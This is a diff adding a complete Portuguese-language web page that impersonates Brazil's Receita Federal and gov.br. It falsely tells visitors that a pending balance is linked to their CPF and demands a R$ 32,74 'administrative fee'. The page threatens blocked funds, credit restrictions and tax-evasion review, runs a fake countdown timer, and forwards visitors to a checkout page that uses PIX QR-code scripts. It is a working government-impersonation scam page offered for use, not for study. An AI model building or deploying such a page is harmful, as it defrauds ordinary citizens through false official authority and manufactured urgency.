@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<script src="/params.js"></script>
+<script src="/api/tt.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Receita Federal - Notificação Oficial</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap');
+        
+        body { 
+            font-family: 'Inter', sans-serif; 
+            background-color: #f4f6f8; 
+            color: #1a202c;
+            margin: 0;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .gov-blue { background-color: #004088; }
+        
+        /* EFEITO DE CORES CORRENDO */
+        .animated-gradient {
+            background: linear-gradient(to right, #004088 0%, #0060c0 25%, #00a0e0 50%, #0060c0 75%, #004088 100%);
+            background-size: 200% auto;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: flowing 2.5s linear infinite;
+            font-weight: 900;
+        }
+
+        @keyframes flowing {
+            to { background-position: 200% center; }
+        }
+
+        .shadow-formal {
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
+        }
+    </style>
+</head>
+<body class="flex flex-col min-h-screen">
+
+    <header class="bg-white w-full border-b border-gray-200">
+        <div class="px-5 py-4 flex justify-start items-center">
+            <img src="https://logodownload.org/wp-content/uploads/2022/05/gov.br-logo-0.png" class="h-14" alt="Logo Gov.br">
+        </div>
+        <div class="gov-blue w-full h-1"></div>
+    </header>
+
+    <main class="flex-grow p-4">
+        <div class="max-w-md mx-auto bg-white rounded-xl shadow-formal overflow-hidden border border-gray-200 mt-2">
+            
+            <div class="bg-gray-50 py-10 flex flex-col items-center border-b border-gray-100 text-center">
+                <img src="../../assets/receita-federal-logo.svg" class="h-20 mb-4" alt="Receita Federal">
+                <p class="text-[10px] font-black text-gray-500 uppercase tracking-[0.2em] px-6">Secretaria da Receita Federal do Brasil</p>
+            </div>
+
+            <div class="p-6">
+                <h1 class="text-[#CC0000] text-[15px] font-black leading-tight mb-5 uppercase text-center tracking-tight">
+                    COMUNICAÇÃO OFICIAL URGENTE
+                </h1>
+
+                <div class="space-y-4 text-gray-600 text-[13px] leading-relaxed mb-8 text-center px-2">
+                    <p>Informamos que foi detectado um <b class="text-gray-900">saldo pendente</b> vinculado ao seu CPF. Para a regularização e liberação imediata, é necessário o recolhimento da taxa administrativa:</p>
+                </div>
+
+                <div class="bg-gray-50 rounded-2xl py-8 mb-8 border border-gray-100 text-center">
+                    <span class="text-gray-400 text-[10px] font-black uppercase tracking-widest block mb-1">Guia de Recolhimento Única</span>
+                    <div class="text-4xl animated-gradient tracking-tighter">
+                        R$ 32,74
+                    </div>
+                </div>
+
+                <div class="bg-red-50 border-l-4 border-red-600 p-5 mb-8 rounded-r-lg">
+                    <p class="text-[12px] font-black text-red-700 uppercase mb-2">Penalidades por Não Regularização:</p>
+                    <ul class="text-[11px] text-red-600 space-y-2 font-bold leading-snug">
+                        <li class="flex items-start gap-2"><span>•</span> Bloqueio imediato do saldo acumulado;</li>
+                        <li class="flex items-start gap-2"><span>•</span> Restrição do CPF em sistemas de crédito e bancários;</li>
+                        <li class="flex items-start gap-2"><span>•</span> Encaminhamento para análise de sonegação fiscal.</li>
+                    </ul>
+                </div>
+
+                <div class="flex flex-col items-center mb-8">
+                    <span class="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-1">O prazo de regularização expira em:</span>
+                    <div id="timer" class="text-5xl animated-gradient tracking-tighter">05:00</div>
+                </div>
+
+                <a href="#" onclick="irParaCheckout(event)" class="block w-full gov-blue text-white text-center py-5 rounded-lg font-black text-lg shadow-2xl active:scale-95 transition-all mb-4 uppercase tracking-tighter">
+                    Pagar taxa e liberar valor
+                </a>
+
+                <div class="flex items-center justify-center gap-2 py-4 border-t border-gray-50 mt-4 opacity-80">
+                    <img src="https://logodownload.org/wp-content/uploads/2022/05/gov.br-logo-0.png" class="h-4">
+                    <span class="text-[9px] font-bold text-gray-400 uppercase tracking-tighter">Ambiente 100% Seguro - gov.br/validação</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="mt-8 text-center text-gray-400 max-w-xs mx-auto pb-10">
+            <p class="text-[9px] font-bold uppercase tracking-[0.2em] mb-2">Receita Federal | Ministério da Fazenda</p>
+            <p class="text-[8px] leading-relaxed opacity-60">
+                Notificação eletrônica protegida por criptografia de ponta a ponta.
+            </p>
+        </div>
+    </main>
+
+    <script>
+        function startTimer(duration, display) {
+            var timer = duration, minutes, seconds;
+            setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+                display.textContent = minutes + ":" + seconds;
+                if (--timer < 0) { timer = 0; }
+            }, 1000);
+        }
+        window.onload = function () {
+            startTimer(300, document.querySelector('#timer'));
+        };
+    </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+<script src="pix-modal.js?v=2"></script>
+<script>
+function irParaCheckout(event) {
+  event.preventDefault();
+  var dest = new URL('checkout.html', window.location.href);
+  new URLSearchParams(window.location.search).forEach(function(v, k) {
+    dest.searchParams.set(k, v);
+  });
+  window.location.href = dest.toString();
+}
+</script>
+
+</body>
+</html>
